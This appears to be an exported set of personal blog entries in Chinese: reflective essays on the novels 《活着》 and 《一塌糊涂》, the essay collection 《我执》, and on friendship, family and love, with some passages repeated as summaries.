乙未年丙戌月己巳日，晨起气虚，身疲心乱，惶惶然不知所之。远黛无言，吾凝眸自语，生而今六千四百日有余，竟不自知。吾常囿于心，或无名之哀，或自傲之觞，或悲怜之恸，或若失之沮，悉不得自已。情不意而卒起，辗转难消，弥而复兴，实不可脱。其必天使惘也，吾岂愿哉？日四食，麑裘葛衣，群居终日，言不及义，语不由心，周而复始，乐此不疲，此吾所见众人之态也，某异其司空见惯，无以为奇。\n某少伶俐，敏于思而巧于言，且样貌清秀，向为乡党殊爱，亦备称大父修德之功。然吾不以为意，尽日悠游，不齿于众小儿斗鸡走狗之态。吾自况于天使，所忧所乐亦必在天地。久之，吾欲无言。忧之弥重，乐之益薄，是故吾常有不喜不忧亦喜亦忧之状，人以为怪，渐远之。某愈无言，自得其乐。天地体大，所忧甚于所乐者远矣，吾遂长忧寡乐，以至于今。吾不知生而何由，逝而何往，孑然蹒跚，草草何益。吾不忍强食弱肉，人为情缚，同室操戈，苍生刍狗。吾不解天地不仁，大道出否，民智不开，其可哀乎。吾不悦，吾不愿，吾不屈，吾不自欺，吾不语人，吾不畏穷，戚戚然乎吾不可奈何。及至祖考坐化，情状愈烈，昔忧发于心，此情伤乎神。某昼不言，夜不语，魂不宁，魄不居，寐中数觉，凭窗望月，千古万人，踽踽如斯。噫，何足叹兮？何足道兮？\n某素闻《活着》系仁义之言，今幸拜读，深受其诲，奉为指归之作，遂欲秉烛夜话，发二三言，以消胸中块垒。\n徐家有子，名唤福贵，因家境殷实，嫖赌成性，娶妻家珍，生女凤霞，育子有庆。其性随父，不务正业，好赌，负于龙二，败尽家财，房、地易主，遂家道中落，命途陡转。旋即其父作古，悲曲始奏。福贵租地自耕，聊以糊口，家奴辞尽，长根行乞。后因母病赴城求医，见征为壮丁，随军北上，九死一生，二三年间，战火纷飞，故土遥遥，生死不料。国军兵败，其为共军所虏，幸归故里，母已身故，未及送别，女病致哑，悲不自胜。幸家有脊梁，希望犹在。俄而有庆献血，枯涸而亡，父筑子坟，其可哀也。后王二喜妻凤霞，凤霞怀苦根，产后出血而亡，其母悲恸，不久卒命。苦根聪颖，香火得续，希望犹在。继而王二喜工伤弃世，家余老幼，福贵苦根，相依为命。居数年，苦根饱食豆子，腹胀而夭。此间之福贵，生无可恋，死无挂碍，希冀无存，心如死水。福贵后购一牛，亦谓福贵，两病残之躯，老而不亡，又享十数年寿。境遇如斯，恐无更甚，字字泣血，我心伤悲。 人生天地间，犹白驹过隙，忽然而已。虽寿夭有别，贵贱不一，然则终期于尽，具归抔土。以是自问，生而何用？掩卷怅然，或得之矣，盖无用乎。生，人之所以生者；死，人之所以死者。死生虽大，亦应随化，生则不必远逐，知足而安；老则顺天应时，向死而生；死则鼓盆而歌，忘我如寐。吾实不知，如此足乎？\n福贵之难，可谓时也，运也，命也。时逢新陈之交，改朝换代，上位易主，黎民食苦。运乃祸不单行，屋漏夜雨，一波三折，缘悭命蹇。吾不知命，且不妄言。此故事也，强言时、运不可怪也。吾曹苟欲鉴古为今，何其难也。当世之人鲜知当世之时，当事之人难断当事之运，况凡人不可悉命。故曰:吾属皆为时、运、命所虏，无一得脱，诚可哀也。使福贵举家赴死，于国有损乎？有益乎？吾等皆福贵之属也，于时势不可尽无，亦不必有，实神鬼之木偶，肉食者之脍具。\n是故为人，实则为器，或问天下，或撷梨花，其何异之有？惟不失本心。福贵虽穷且困，不为非歹，知恩重义，纵死不辜。此其所以笑谈旧痛而无愧无伤，亦其妻所以死而瞑目也。吾知之也，人之于世，不求有为，但得无愧。\n福贵已已，某值少年，不喜游荡，不好掘藏，乐作和尚，何为其然也？吾不知。吾且无言，且诗且酒趁年华，且行且赏且由他。\n","permalink":"https://ret2neo.cn/mind/160806living/","summary":"指归夜话 乙未年丙戌月己巳日，晨起气虚，身疲心乱，惶惶然不知所之。远黛无言，吾凝眸自语，生而今六千四百日有余，竟不自知。吾常囿于心，或无名之哀，或自傲之觞，或悲怜之恸，或若失之沮，悉不得自已。情不意而卒起，辗转难消，弥而复兴，实不可脱。其必天使惘也，吾岂愿哉？日四食，麑裘葛衣，群居终日，言不及义，语不由心，周而复始，乐此不疲，此吾所见众人之态也，某异其司空见惯，无以为奇。\n某少伶俐，敏于思而巧于言，且样貌清秀，向为乡党殊爱，亦备称大父修德之功。然吾不以为意，尽日悠游，不齿于众小儿斗鸡走狗之态。吾自况于天使，所忧所乐亦必在天地。久之，吾欲无言。忧之弥重，乐之益薄，是故吾常有不喜不忧亦喜亦忧之状，人以为怪，渐远之。某愈无言，自得其乐。天地体大，所忧甚于所乐者远矣，吾遂长忧寡乐，以至于今。吾不知生而何由，逝而何往，孑然蹒跚，草草何益。吾不忍强食弱肉，人为情缚，同室操戈，苍生刍狗。吾不解天地不仁，大道出否，民智不开，其可哀乎。吾不悦，吾不愿，吾不屈，吾不自欺，吾不语人，吾不畏穷，戚戚然乎吾不可奈何。及至祖考坐化，情状愈烈，昔忧发于心，此情伤乎神。某昼不言，夜不语，魂不宁，魄不居，寐中数觉，凭窗望月，千古万人，踽踽如斯。噫，何足叹兮？何足道兮？\n某素闻《活着》系仁义之言，今幸拜读，深受其诲，奉为指归之作，遂欲秉烛夜话，发二三言，以消胸中块垒。\n徐家有子，名唤福贵，因家境殷实，嫖赌成性，娶妻家珍，生女凤霞，育子有庆。其性随父，不务正业，好赌，负于龙二，败尽家财，房、地易主，遂家道中落，命途陡转。旋即其父作古，悲曲始奏。福贵租地自耕，聊以糊口，家奴辞尽，长根行乞。后因母病赴城求医，见征为壮丁，随军北上，九死一生，二三年间，战火纷飞，故土遥遥，生死不料。国军兵败，其为共军所虏，幸归故里，母已身故，未及送别，女病致哑，悲不自胜。幸家有脊梁，希望犹在。俄而有庆献血，枯涸而亡，父筑子坟，其可哀也。后王二喜妻凤霞，凤霞怀苦根，产后出血而亡，其母悲恸，不久卒命。苦根聪颖，香火得续，希望犹在。继而王二喜工伤弃世，家余老幼，福贵苦根，相依为命。居数年，苦根饱食豆子，腹胀而夭。此间之福贵，生无可恋，死无挂碍，希冀无存，心如死水。福贵后购一牛，亦谓福贵，两病残之躯，老而不亡，又享十数年寿。境遇如斯，恐无更甚，字字泣血，我心伤悲。 人生天地间，犹白驹过隙，忽然而已。虽寿夭有别，贵贱不一，然则终期于尽，具归抔土。以是自问，生而何用？掩卷怅然，或得之矣，盖无用乎。生，人之所以生者；死，人之所以死者。死生虽大，亦应随化，生则不必远逐，知足而安；老则顺天应时，向死而生；死则鼓盆而歌，忘我如寐。吾实不知，如此足乎？\n福贵之难，可谓时也，运也，命也。时逢新陈之交，改朝换代，上位易主，黎民食苦。运乃祸不单行，屋漏夜雨，一波三折，缘悭命蹇。吾不知命，且不妄言。此故事也，强言时、运不可怪也。吾曹苟欲鉴古为今，何其难也。当世之人鲜知当世之时，当事之人难断当事之运，况凡人不可悉命。故曰:吾属皆为时、运、命所虏，无一得脱，诚可哀也。使福贵举家赴死，于国有损乎？有益乎？吾等皆福贵之属也，于时势不可尽无，亦不必有，实神鬼之木偶，肉食者之脍具。\n是故为人，实则为器，或问天下，或撷梨花，其何异之有？惟不失本心。福贵虽穷且困，不为非歹，知恩重义，纵死不辜。此其所以笑谈旧痛而无愧无伤，亦其妻所以死而瞑目也。吾知之也，人之于世，不求有为，但得无愧。\n福贵已已，某值少年，不喜游荡，不好掘藏，乐作和尚，何为其然也？吾不知。吾且无言，且诗且酒趁年华，且行且赏且由他。","title":"《活着》"},{"content":"非其境者，不能摄受。从来如此。我想早迟是应当再读的。当下且先给这等待潮水抹煞的脚印留些描述，就算大家都不曾抑或不屑了解，无意甚或相约遗忘，我也舍不得抛弃那嚣张而可爱的姿态，忘不得他自顾自占领整个海岸，企图在天黑前包围大海的决心。\n“我都知道了；这一切谎言与妄想，卑鄙与怯懦。它们就像颜料和素材，正好可以涂抹出一整座城市，以及其中无数的场景和遭遇。”\n这写在《我执》的开始。似乎已得了看破妄想，舍得执着的大义。当看完全书，只是感慨差了些，凡成不得释迦都差了些。什么都不明白的最舒服，明了得多了，渐生出失望，更多一些，又有了希望，再多一些，就不望了，大概是明白了希望也是假的又不好意思说破。安静地忧郁着，理智地哀伤着，我看这是人世最真且爽的状态了。每个时代都有人前赴后继地奔跑着，他们不愿意追随前人，或者看着左边跑向右边，后来他们往往衣衫褴褛，白发苍苍，在街角迷了路。最后的最后，终究无法带着年轻身躯到达那看不见的城市的一群老汉在一座不知名城池破旧残败的墙根下看着布衣单剑，策马扬鞭，身无分文，却孤勇朝天的少年舍弃所有，义无反顾。咦，这画面有些熟悉，那一日到如今估摸着有一个甲子的光景了吧。当然也有一两个，早早不再怒吼咆哮，甚至不再窃窃低语，全心全意地做这美丽世界的美丽孤儿，智慧地笑对还在问“为什么”或者还在问“为什么还在问为什么”的孩子们。我虽然说不清那笑容里的成分，不过，我也知道了一些，这是谍中谍，这一场忙活，干的不是脚力，是心力。\n一向觉得，知道的多的，说的少，说的多的，知道的少。而我等半懂不懂，想知难知的便整日哼哼唧唧，连做梦都免不得呓语一番，好像说得圆润些了也能悟得通透些一样。\n其实我看这日记一样的文章，也有点像梦话，像是浮生一梦里的碎碎念。偶尔聪明，偶尔糊涂，偶尔拨云，偶尔雷霆，实在没有什么十分高明之处。若说高明，也许在更清楚的逻辑与更能写心之所想的文笔吧。你很精当地说出了我久郁于心的苦涩，使我仿佛得到春风化雨般的解脱，我便有些喜欢你了。然而许多人不明白，春雨的滋润过后还有炎夏的酷热，悲秋的萧索，寒冬的肃杀，以及年复一年轮回的煎熬。他们只是诧异，我曾心旷神怡，清明开悟，如今这又是怎么了呢？是啊，怎么了呢，令你开悟的人也不懂吧。\n一般而言，散文集应该是不适合一口气看完，闲暇时翻翻，偶遇一两句动心之语更享受一些。然而我在不知道它是散文集的情况下懵懵懂懂一口气读完，倒也有了些更全局性的了解。虽然不了解背景，但我臆测作者似乎怀着情伤写的文字。开始还有所克制，反倒悟出些情场警语，摸索出些与《爱经》相契合的感悟，到了最后夜行如鬼的片段，深藏着的不安，彷徨，矛盾，痛苦一一浮现，作者带着年少时便有的叛逆，让我惊叹这行走在时间边缘的伟大勇气和竭力对抗桎梏的不凡探索。虽是散文集，内在的思想性态与思维模式却一脉相承，企图觉醒的波浪一阵高过一阵，在最后达到了令我瞠目结舌的高潮，更为奇异的是，这个过程平静的有些古怪，带着一种自残式的冷漠，仿佛看到白炽灯下作者鲜红的嘴角挂着的狞笑。这令许多人不寒而栗，但我会和他一起笑，割下自己的肉，就像割他的一样。我很欣赏这一丝冷漠带来的安慰，这令我觉得没有白花时间读他。\n“你所见到的，只不过是自己的想象；你以为是自己的，只不过是种偶然。握得越紧越是徒然。此之谓我执。”\n这是作者取自小乘佛法的感悟，但就通篇看来，也只是感悟感悟罢了。然而，即便如此也没有什么好苛求的，毕竟本不该奢望什么曲径通幽。相反的，倒应当感谢最后的一丝不透彻，如若没了它，我等也就欣赏不到另一个灵魂的垂死挣扎，辜负其自我解剖以供展览的好意，更演砸了作者精心编排的剧目。\n归根结底，所谓我执，痛苦时才会寻求摆脱。对芸芸众生而言，这只是偶尔的跃迁，不可能成为常态的。用心看看，用心谢谢，用心笑笑，接着用心苟活就好了。当然，这是一些人对另一些人说的，但说话者本身才不会真正去做的，他们要挑战，像作者一样，挑战一切不可战胜的，质疑所有广泛认同的，拒绝全部理所当然的，赶在天黑之前，包围大海。\n站在愚鲁者的角度，我有充分的理由把这当做一纸与命运妥协的契约，上面沾满了年少的鲜血和岁月的风尘，当不甘渐渐消弭，他将这良民证高高举过头顶，“你们看，我输了”。于是我们唏嘘感叹，又默默藏好自己的。\n回过头来，我执是一切生产力的根本。虽然是自己抓着自己，想松开却是不易的，也是不舍得。我执是不可以大规模扼杀的，从这点上看，我王地狱不空誓不成佛的念想也令我有些疑惑。\n","permalink":"https://ret2neo.cn/mind/160806holdmyself/","summary":"非其境者，不能摄受。从来如此。我想早迟是应当再读的。当下且先给这等待潮水抹煞的脚印留些描述，就算大家都不曾抑或不屑了解，无意甚或相约遗忘，我也舍不得抛弃那嚣张而可爱的姿态，忘不得他自顾自占领整个海岸，企图在天黑前包围大海的决心。\n“我都知道了；这一切谎言与妄想，卑鄙与怯懦。它们就像颜料和素材，正好可以涂抹出一整座城市，以及其中无数的场景和遭遇。”\n这写在《我执》的开始。似乎已得了看破妄想，舍得执着的大义。当看完全书，只是感慨差了些，凡成不得释迦都差了些。什么都不明白的最舒服，明了得多了，渐生出失望，更多一些，又有了希望，再多一些，就不望了，大概是明白了希望也是假的又不好意思说破。安静地忧郁着，理智地哀伤着，我看这是人世最真且爽的状态了。每个时代都有人前赴后继地奔跑着，他们不愿意追随前人，或者看着左边跑向右边，后来他们往往衣衫褴褛，白发苍苍，在街角迷了路。最后的最后，终究无法带着年轻身躯到达那看不见的城市的一群老汉在一座不知名城池破旧残败的墙根下看着布衣单剑，策马扬鞭，身无分文，却孤勇朝天的少年舍弃所有，义无反顾。咦，这画面有些熟悉，那一日到如今估摸着有一个甲子的光景了吧。当然也有一两个，早早不再怒吼咆哮，甚至不再窃窃低语，全心全意地做这美丽世界的美丽孤儿，智慧地笑对还在问“为什么”或者还在问“为什么还在问为什么”的孩子们。我虽然说不清那笑容里的成分，不过，我也知道了一些，这是谍中谍，这一场忙活，干的不是脚力，是心力。\n一向觉得，知道的多的，说的少，说的多的，知道的少。而我等半懂不懂，想知难知的便整日哼哼唧唧，连做梦都免不得呓语一番，好像说得圆润些了也能悟得通透些一样。\n其实我看这日记一样的文章，也有点像梦话，像是浮生一梦里的碎碎念。偶尔聪明，偶尔糊涂，偶尔拨云，偶尔雷霆，实在没有什么十分高明之处。若说高明，也许在更清楚的逻辑与更能写心之所想的文笔吧。你很精当地说出了我久郁于心的苦涩，使我仿佛得到春风化雨般的解脱，我便有些喜欢你了。然而许多人不明白，春雨的滋润过后还有炎夏的酷热，悲秋的萧索，寒冬的肃杀，以及年复一年轮回的煎熬。他们只是诧异，我曾心旷神怡，清明开悟，如今这又是怎么了呢？是啊，怎么了呢，令你开悟的人也不懂吧。\n一般而言，散文集应该是不适合一口气看完，闲暇时翻翻，偶遇一两句动心之语更享受一些。然而我在不知道它是散文集的情况下懵懵懂懂一口气读完，倒也有了些更全局性的了解。虽然不了解背景，但我臆测作者似乎怀着情伤写的文字。开始还有所克制，反倒悟出些情场警语，摸索出些与《爱经》相契合的感悟，到了最后夜行如鬼的片段，深藏着的不安，彷徨，矛盾，痛苦一一浮现，作者带着年少时便有的叛逆，让我惊叹这行走在时间边缘的伟大勇气和竭力对抗桎梏的不凡探索。虽是散文集，内在的思想性态与思维模式却一脉相承，企图觉醒的波浪一阵高过一阵，在最后达到了令我瞠目结舌的高潮，更为奇异的是，这个过程平静的有些古怪，带着一种自残式的冷漠，仿佛看到白炽灯下作者鲜红的嘴角挂着的狞笑。这令许多人不寒而栗，但我会和他一起笑，割下自己的肉，就像割他的一样。我很欣赏这一丝冷漠带来的安慰，这令我觉得没有白花时间读他。\n“你所见到的，只不过是自己的想象；你以为是自己的，只不过是种偶然。握得越紧越是徒然。此之谓我执。”\n这是作者取自小乘佛法的感悟，但就通篇看来，也只是感悟感悟罢了。然而，即便如此也没有什么好苛求的，毕竟本不该奢望什么曲径通幽。相反的，倒应当感谢最后的一丝不透彻，如若没了它，我等也就欣赏不到另一个灵魂的垂死挣扎，辜负其自我解剖以供展览的好意，更演砸了作者精心编排的剧目。\n归根结底，所谓我执，痛苦时才会寻求摆脱。对芸芸众生而言，这只是偶尔的跃迁，不可能成为常态的。用心看看，用心谢谢，用心笑笑，接着用心苟活就好了。当然，这是一些人对另一些人说的，但说话者本身才不会真正去做的，他们要挑战，像作者一样，挑战一切不可战胜的，质疑所有广泛认同的，拒绝全部理所当然的，赶在天黑之前，包围大海。\n站在愚鲁者的角度，我有充分的理由把这当做一纸与命运妥协的契约，上面沾满了年少的鲜血和岁月的风尘，当不甘渐渐消弭，他将这良民证高高举过头顶，“你们看，我输了”。于是我们唏嘘感叹，又默默藏好自己的。\n回过头来，我执是一切生产力的根本。虽然是自己抓着自己，想松开却是不易的，也是不舍得。我执是不可以大规模扼杀的，从这点上看，我王地狱不空誓不成佛的念想也令我有些疑惑。","title":"《我执》"},{"content":"自古逢秋悲寂寥，我言年年有今朝 我总是怀疑，那些我们曾经或依然念念不忘的是否真的在某一日终有回响？\n我想自己还是太过年轻，年轻到不足以谈论起情感这样一个宏大复杂的话题。但我也渐渐明白，一个人在每个人生阶段的想法对自己而言都是独一无二且至关重要的，无论这种想法回头看时会显得多么自以为是甚至荒唐可笑。实际上两个人没理由也没立场去互相褒贬指摘对方的想法，不同阶段的同一个人也是。不能两次踏进同一条河，也不能一次踏进两条河里，所谓醒来可能是另一个梦，所谓死去或许是回到故乡，所谓成长有些像是幻想，所谓理解大概只是妥协。当有天，你和从前的你四目相对，互不相识，你们谈论起理想与人生，幸福与意义，存在与追求，你们谈论的，好像不再是同一回事，于是，你们苦笑摇头，错身而过。在这之后的某个午夜忽然醒来后的一两个刹那里，你不知何时何地，再两个刹那，你就明白了自己究竟有多孤独。\n从远古走来，人类一直孤独，也一直寻求解药，但并不能真正改变什么。深埋在简陋灵魂下的孤独基因并没有在红灯绿酒，歌舞升平的摩登时代里有丝毫消减，相反地，大有愈演愈烈的趋势。酒色财气，声色货利对当代人精神领域的鲸吞蚕食大大提高了人们对于快感刺激的阈值。我们越来越不能被满足，越来越挑剔和脆弱，表面快要溢出的热情无法掩盖内心滴水成冰的冷漠。真挚的感情渐渐成了对人生奢侈的期待，全球在一点点变冷。\n情感大概有友情亲情和爱情，它们有所不同，但我没有足够的智慧来给出明确的界定，因此也就囫囵谈谈。\n朋友是个高尚的词，唯内心坦荡，灵魂共鸣的人可互相称呼。除此之外，它也别无要求。陌生人、情人、亲人之间都可能成为朋友，他们之间都可能拥有友情。但可能并不意味着容易。如果“三杯酒下肚就可以唤你朋友”那人人都应该酗酒。只是残酷的是，连李白这样金樽不曾空对月的人终其一生的朋友也屈指可数。其实我们可以感觉到，点头之交的背后是人际信任的日渐式微，是慵懒和畏惧的不断侵蚀。我们何尝未曾幻想让阳光温暖赤子之心，只是寒风烈烈，削肌切骨，我们终于还是用谎言和假笑裹起了自己，一点点地变成了他人眼中的地狱。我们肤浅地交往着，苟且地谈论着，面目可憎地踽踽独行着，又神情悲愤地感时伤世着。我们有了点赞转发评论这样虽缺乏诚意却不费心力，虽古怪畸形却蔚然成风的交往方式，便不再常常有饮茶话旧，把酒问月的真情。我们有了夸张扭曲却博人眼球的社交平台聊天表情后，只要手指灵活，各种面具转换自如，嬉笑怒骂更是信手拈来。低头是个八面玲珑的性情中人，抬头却是个面部僵硬的冷眼看客。富贵时誓同生死的称兄道弟回头来却是患难时避而远之的泾渭分明。我很早就已不信，世上还会有许多真正能为朋友两肋插刀而至死不渝的人，后来我又开始怀疑，这样的人真的能有幸遇见值得这份对待的彼此吗？\n亲人是大部分人一辈子的感动和羁绊。我们在漫天风雪里找到一间草庐，草庐里的人与我们共享维系生命的资源，我们彼此取暖，感激与爱护让我们紧紧相依，度过一个又一个短暂的冬天。我们忽远忽近，却不离不弃。我们始终没有离开草庐。被迫或胆敢离开的一小撮人也都接连死在了天地的肃杀中。我们更加不愿离开。一个又一个冬天过去了，我们依然没有离开。这让我不禁可耻地怀疑，这莫非是一个温柔的阴谋，一个甜蜜的枷锁。这样想着，我感到良心受着火烤一般。我又忍不住去问，孙悟空之所以是齐天大圣，莫不是因为他从石缝中出来？这样想着，我又感到无比地煎熬。毛主席说过，无情未必真豪杰。既然真豪杰都立如斯言，那我大概是杞人忧天了。\n情人是寂寞最好的解药，也是世上最高明的毒药。荷尔蒙引起的快感虽不比海洛因，却也不失为一种很好的堕落。当女孩们白花花的大腿在我身旁耀眼地摇晃时，我感觉自己体内发生着一种奇异的变化，肾上腺素上去了，心不累了，神不乱了，难题不得解也不悲观厌世了。岁月是安平的，时光是静好的，阳光是温暖而不刺眼的，花儿是芳香而对我微笑的，屡试不第也愿意抱柱而死，天下纷乱只甘心化蝶双飞。我忍不住歌颂，忍不住赞美，忍不住向全世界夸耀这无与伦比的好东西。我也因此忘了我一点点流逝着的生命，好像一切可以永恒一样。我想这一定是上天赐予我的独一无二的恩宠，世上一定找不到第二样东西能让我那般快乐了。直到大腿们远去了。我陷入了深深的思考。我们所眷恋的，究竟是那一双双无比香艳的大长腿，还是那时的阳光和鲜花呢？如果换一双腿，我们会有同样的兴奋，还是有所谓情深缘浅的凄怆，抑或是比当时有过之而无不及的愉悦呢？柏拉图说，爱情是一种严重的精神疾病。那么治愈我们的究竟只能是她们还是恰好是她们呢？当我铿锵有力地质问完毕时，不禁感到内里空乏，底气不足，于是我红着脸在心里汪了两声。\n鲁迅先生曾说，无尽的远方和无数的人们都和我有关。这真是一种浩瀚的真情啊。但我怀疑，那是些无数无尽的无所用心的对象。\n日子很快，很多东西在变化，我自己也是，有时清醒，有时迷糊。每当问起自己这一生当如何度过，便又想起那句\u0026quot;陆然，你真的认为，在普通生活之外，还有更值得追求的东西吗？\u0026quot; ，接着就什么也想不起来。我不知道以后的自己会怎么想，正如已记不起过去的自己怎么想，所以唯一可做的就是，记下来当下的想法。但我知道这也是徒然，因为我已很难理解从前的自己偶有感触而兴致盎然地写下的东西。既然如此，那我们为什么还老想写点啥呢？因为毕竟，除此之外，还有什么，可以对抗，那不存在的敌人？\n","permalink":"https://ret2neo.cn/mind/160606loveandlife/","summary":"自古逢秋悲寂寥，我言年年有今朝 我总是怀疑，那些我们曾经或依然念念不忘的是否真的在某一日终有回响？\n我想自己还是太过年轻，年轻到不足以谈论起情感这样一个宏大复杂的话题。但我也渐渐明白，一个人在每个人生阶段的想法对自己而言都是独一无二且至关重要的，无论这种想法回头看时会显得多么自以为是甚至荒唐可笑。实际上两个人没理由也没立场去互相褒贬指摘对方的想法，不同阶段的同一个人也是。不能两次踏进同一条河，也不能一次踏进两条河里，所谓醒来可能是另一个梦，所谓死去或许是回到故乡，所谓成长有些像是幻想，所谓理解大概只是妥协。当有天，你和从前的你四目相对，互不相识，你们谈论起理想与人生，幸福与意义，存在与追求，你们谈论的，好像不再是同一回事，于是，你们苦笑摇头，错身而过。在这之后的某个午夜忽然醒来后的一两个刹那里，你不知何时何地，再两个刹那，你就明白了自己究竟有多孤独。\n从远古走来，人类一直孤独，也一直寻求解药，但并不能真正改变什么。深埋在简陋灵魂下的孤独基因并没有在红灯绿酒，歌舞升平的摩登时代里有丝毫消减，相反地，大有愈演愈烈的趋势。酒色财气，声色货利对当代人精神领域的鲸吞蚕食大大提高了人们对于快感刺激的阈值。我们越来越不能被满足，越来越挑剔和脆弱，表面快要溢出的热情无法掩盖内心滴水成冰的冷漠。真挚的感情渐渐成了对人生奢侈的期待，全球在一点点变冷。\n情感大概有友情亲情和爱情，它们有所不同，但我没有足够的智慧来给出明确的界定，因此也就囫囵谈谈。\n朋友是个高尚的词，唯内心坦荡，灵魂共鸣的人可互相称呼。除此之外，它也别无要求。陌生人、情人、亲人之间都可能成为朋友，他们之间都可能拥有友情。但可能并不意味着容易。如果“三杯酒下肚就可以唤你朋友”那人人都应该酗酒。只是残酷的是，连李白这样金樽不曾空对月的人终其一生的朋友也屈指可数。其实我们可以感觉到，点头之交的背后是人际信任的日渐式微，是慵懒和畏惧的不断侵蚀。我们何尝未曾幻想让阳光温暖赤子之心，只是寒风烈烈，削肌切骨，我们终于还是用谎言和假笑裹起了自己，一点点地变成了他人眼中的地狱。我们肤浅地交往着，苟且地谈论着，面目可憎地踽踽独行着，又神情悲愤地感时伤世着。我们有了点赞转发评论这样虽缺乏诚意却不费心力，虽古怪畸形却蔚然成风的交往方式，便不再常常有饮茶话旧，把酒问月的真情。我们有了夸张扭曲却博人眼球的社交平台聊天表情后，只要手指灵活，各种面具转换自如，嬉笑怒骂更是信手拈来。低头是个八面玲珑的性情中人，抬头却是个面部僵硬的冷眼看客。富贵时誓同生死的称兄道弟回头来却是患难时避而远之的泾渭分明。我很早就已不信，世上还会有许多真正能为朋友两肋插刀而至死不渝的人，后来我又开始怀疑，这样的人真的能有幸遇见值得这份对待的彼此吗？\n亲人是大部分人一辈子的感动和羁绊。我们在漫天风雪里找到一间草庐，草庐里的人与我们共享维系生命的资源，我们彼此取暖，感激与爱护让我们紧紧相依，度过一个又一个短暂的冬天。我们忽远忽近，却不离不弃。我们始终没有离开草庐。被迫或胆敢离开的一小撮人也都接连死在了天地的肃杀中。我们更加不愿离开。一个又一个冬天过去了，我们依然没有离开。这让我不禁可耻地怀疑，这莫非是一个温柔的阴谋，一个甜蜜的枷锁。这样想着，我感到良心受着火烤一般。我又忍不住去问，孙悟空之所以是齐天大圣，莫不是因为他从石缝中出来？这样想着，我又感到无比地煎熬。毛主席说过，无情未必真豪杰。既然真豪杰都立如斯言，那我大概是杞人忧天了。\n情人是寂寞最好的解药，也是世上最高明的毒药。荷尔蒙引起的快感虽不比海洛因，却也不失为一种很好的堕落。当女孩们白花花的大腿在我身旁耀眼地摇晃时，我感觉自己体内发生着一种奇异的变化，肾上腺素上去了，心不累了，神不乱了，难题不得解也不悲观厌世了。岁月是安平的，时光是静好的，阳光是温暖而不刺眼的，花儿是芳香而对我微笑的，屡试不第也愿意抱柱而死，天下纷乱只甘心化蝶双飞。我忍不住歌颂，忍不住赞美，忍不住向全世界夸耀这无与伦比的好东西。我也因此忘了我一点点流逝着的生命，好像一切可以永恒一样。我想这一定是上天赐予我的独一无二的恩宠，世上一定找不到第二样东西能让我那般快乐了。直到大腿们远去了。我陷入了深深的思考。我们所眷恋的，究竟是那一双双无比香艳的大长腿，还是那时的阳光和鲜花呢？如果换一双腿，我们会有同样的兴奋，还是有所谓情深缘浅的凄怆，抑或是比当时有过之而无不及的愉悦呢？柏拉图说，爱情是一种严重的精神疾病。那么治愈我们的究竟只能是她们还是恰好是她们呢？当我铿锵有力地质问完毕时，不禁感到内里空乏，底气不足，于是我红着脸在心里汪了两声。\n鲁迅先生曾说，无尽的远方和无数的人们都和我有关。这真是一种浩瀚的真情啊。但我怀疑，那是些无数无尽的无所用心的对象。\n日子很快，很多东西在变化，我自己也是，有时清醒，有时迷糊。每当问起自己这一生当如何度过，便又想起那句\u0026quot;陆然，你真的认为，在普通生活之外，还有更值得追求的东西吗？\u0026quot; ，接着就什么也想不起来。我不知道以后的自己会怎么想，正如已记不起过去的自己怎么想，所以唯一可做的就是，记下来当下的想法。但我知道这也是徒然，因为我已很难理解从前的自己偶有感触而兴致盎然地写下的东西。既然如此，那我们为什么还老想写点啥呢？因为毕竟，除此之外，还有什么，可以对抗，那不存在的敌人？","title":"关于情感"},{"content":"《一塌糊涂》 在继《晃晃悠悠》、《支离破碎》之后，我终于花了一整天时间完成了对石康青春三部曲中最后一部《一塌糊涂》的阅读。今天是二零一六年的劳动节，图书馆关了门，自习室少有人，大家都忙着去寻找乐趣了，然而于我而言，这一天与以往或是将来的任何一天不会有太大的分别。我在无所事事的心境下游荡，徘徊，找着一件能消磨时光又不那么令人厌恶的事情，一头扎进去，待到红日又西沉，感慨江水常东流。其实也算不得一整天。昨夜打球过度，回宿舍后疲惫不堪，甚至洗完澡也没有丝毫缓解，又作死与舍友一同订了双鸡堡与大鸡排。一行四人开着无关痛痒的玩笑，逗着重复而无新意的段子，偶尔冒出一两句有些愚蠢的俏皮话，一派其乐融融的景象。我不知道他们作何感想，反正我是感到极大的无趣，我不过是怕他们觉得无话可说的尴尬，若是独处，我是情愿终日无言的。吃过鸡排和汉堡，这垃圾食品满足了我短暂的口腹之欲，却在过后令我腹中有火烧之感，加上身体疲惫，不适感前所未有。吹干头发后连忙上床，企图通过睡眠缓解或是弥补这一切。说来睡眠真是好东西，它让我们耗散的精力得以填补，以此能够开始新的一日更加肆无忌惮、不知死活的耗散。有时睡醒后我总会想起王小波那句“以为自己会一直生猛下去”。其实我很难想象，但还是有些担心自己不能再生猛，不能再在打球时把地板跺得很响。嗯，虽然那种不适令我难以入眠，但没过多久，我还是睡着了。醒来已是九点半，我顿时被一种无所事事的感觉袭满全身。我不知道自己要干什么，要去哪里，我的价值在何处，我甚至无法确定自己的天赋。我只能看书，看各种书，或电影。企图从中找到一丝启发，一点安慰也好，渐渐的我发现那都没有什么用。我看得很慢，但忘得很快，我看到作者同我一样混乱的思路，不得要领的分析和草率的结论。也就是说，我基本一无所获。但我怎么会甘心呢，我还是得看啊，我得不断地试错。\n于是一番来回走动后已是十二点多，我背上大书包，抄上《一塌糊涂》便踱着懒散的步子出发了。我打算先吃个饱饭来满足我的身体，再找个安静的地方安慰一下我的灵魂。我走在路上。路上人很少，我看到天空、白云、柏油路、绿树、青草、高大的建筑，我闻到花香、空气和美女。我走在路上，脑子里空空荡荡。我吃了个饭，脑子里空空荡荡。我现在看完了书，有很多想法捆在一起，毫无头绪，还不如空空荡荡。我这状态很糟，但我不希望别人觉得我亟待拯救或亟须向积极的方向改变。我执着地期待着，我应该有自己的出路。\n石康在三十二岁左右，即二零零零年前后完成了三部曲的最后一部《一塌糊涂》。他说自己要把三部曲撕碎，抛在风中，并且到俗世里争取他应有的地位，去证明他应有的价值。而今十数年过去了，我不知道他近况如何，作何感想。是否在那一堆他看不上的人群中谋得一席之地。据说他近来出国了，希望他过得好吧。\n其实本质上石康和我很相像，我总能在书中感受到一些似曾相识的想法或是一些还在孕育中的感悟。所以许多时候，我在阅读他时有种酣畅淋漓的快感。他出身普通，但热忱。我在完整地阅读过他的三部曲后对他的印象有了一个大致的概括。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 如何评价石康？ 东郭热，人生如逆旅，我亦是行人。 对世界彻底的悲观失望以及自认为看清一切后的无所事事的晃晃悠悠状态下的上进与热爱生活 